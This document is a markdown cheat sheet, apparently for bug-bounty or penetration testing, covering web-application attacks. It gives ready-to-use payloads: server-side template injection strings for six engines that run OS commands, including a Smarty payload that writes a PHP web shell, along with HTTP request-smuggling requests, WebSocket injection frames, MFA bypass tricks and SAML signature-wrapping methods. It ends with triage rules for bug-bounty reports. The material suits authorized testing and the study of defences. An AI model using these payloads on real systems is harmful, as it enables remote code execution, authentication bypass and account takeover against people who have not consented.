# Security Arsenal Reference Details

## SSTI Detection Payloads

Identify template engine via polyglot or probe tree: `${7*7}`, `{{7*7}}`, `<%= 7*7 %>`, `#{7*7}`, `*{7*7}`.

### Jinja2 / Flask / Python
```text
{{7*7}} -> 49
{{config.items()}}
{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}
{{lipsum.__globals__["os"].popen('id').read()}}
```

### Twig / PHP
```text
{{7*7}} -> 49
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

### FreeMarker / Java
```text
${7*7} -> 49
<#assign ex="freemarker.template.utility.Execute"?new()> ${ex("id")}
```

### Smarty / PHP
```text
{7*7} -> 49
{Smarty_Internal_Write_File::writeFile('shell.php','<?php system($_GET["c"]); ?>',self::clearConfig())}
```

### Ruby ERB
```text
<%= 7*7 %> -> 49
<%= system('id') %>
<%= `id` %>
```

### Spring Expression Language (SpEL)
```text
${7*7} -> 49
${T(java.lang.Runtime).getRuntime().exec("calc.exe")}
```

---

## HTTP Request Smuggling

### CL.TE (Frontend uses Content-Length, Backend uses Transfer-Encoding)
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

### TE.CL (Frontend uses Transfer-Encoding, Backend uses Content-Length)
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0


```

### TE.TE (Obfuscating the Transfer-Encoding header)
```http
Transfer-Encoding: xchunked
Transfer-Encoding[tab]: chunked
Transfer-Encoding: chunked\r\nTransfer-Encoding: identity
```

---

## WebSocket Payloads

### Cross-Site WebSocket Hijacking (CSWSH)
- Missing `Origin` header validation during WebSocket handshake (`Upgrade: websocket`).
- Attacker page opens WebSocket to target and listens on `ws.onmessage` to exfiltrate private user feeds.

### WebSocket Frame Injection
```text
{"type":"ping"}
{"action":"updateProfile","role":"admin"}
{"message":"<script>alert(1)</script>"}
```

---

## MFA / 2FA Bypass Payloads

1. **Response Manipulation**:
   - Change response from `{"success":false,"code":401}` to `{"success":true,"code":200}` or `{"authenticated":true}`.
2. **Direct Endpoint Navigation**:
   - After primary auth, browse straight to `/dashboard`, `/api/v1/user/account`, or `/settings` without submitting OTP.
3. **Brute-Force with Rate Limit Bypass**:
   - Header spoofing: `X-Forwarded-For: 127.0.0.1`, `X-Real-IP: 10.0.0.X`, `Client-IP: 192.168.1.X`.
   - Null-byte or whitespace padding in OTP parameters.
4. **Token Replay / Leakage**:
   - OTP code reflected in API response payload or Set-Cookie header.
   - Reusing the same valid OTP across multiple accounts or sessions.

---

## SAML Attacks

1. **XML Signature Wrapping (XSW)**:
   - Inject an unsigned, cloned assertion before or after the signed assertion.
   - Tamper with attributes in the outer assertion while keeping signature valid on the inner assertion.
2. **XML Comment Injection**:
   - `admin<!--comment-->@target.com` bypasses strict email matching when comments are stripped before evaluation.

---

## GF Patterns & Triage Criteria

### GF Pattern Types (`tomnomnom/gf`)
- `gf xss`: Flags parameters like `q=`, `search=`, `redirect=`, `url=`, `name=`.
- `gf ssti`: Flags template injection vectors `template=`, `preview=`, `render=`.
- `gf ssrf`: Flags URL fetch vectors `dest=`, `redirect_uri=`, `feed=`, `callback=`.
- `gf sqli`: Flags database parameters `id=`, `order=`, `sort=`, `select=`.
- `gf idor`: Flags object identifiers `user_id=`, `account=`, `doc_id=`.
- `gf rce`: Flags command/file execution params `cmd=`, `exec=`, `path=`, `file=`.

### Non-Qualifying / Always Rejected Reports
- Missing SPF/DKIM/DMARC records without demonstrated spoofing vulnerability.
- Rate limiting missing on public contact forms or search queries without resource exhaustion.
- Missing HTTP security headers (`X-Frame-Options`, `HSTS`, `CSP`) without proven exploitation chain.
- Self-XSS (requiring user to paste code into developer tools console).
- Logout CSRF without state alteration.

### Conditionally Valid Findings (Require Demonstrated Impact)
- Open Redirect: Must demonstrate session hijacking, token theft (OAuth redirect_uri leakage), or credential phishing chain.
- CORS Misconfiguration (`Access-Control-Allow-Origin: *`): Must demonstrate exfiltration of authenticated, sensitive user data (credentials: include).
